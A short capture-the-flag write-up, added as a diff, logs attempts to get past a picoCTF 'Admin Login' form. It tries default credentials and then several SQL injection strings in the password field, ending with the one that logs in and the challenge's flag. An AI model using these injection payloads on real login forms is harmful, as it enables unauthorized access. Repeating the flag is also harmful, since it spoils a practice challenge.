@@ -1,0 +1,23 @@
+#I open the link and then go to " Admin Login "
+
+username : admin 
+password : admin
+Login failed.
+# it did not work
+
+#password : admin' /*
+Login failed.
+# it did not work
+
+#password : '' or 1=1
+Login failed.
+# it did not work
+
+#password : ' OR '1'='1' /* 
+Login failed.
+# it did not work
+
+#password : ' or ''='
+Logged in!
+
+Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
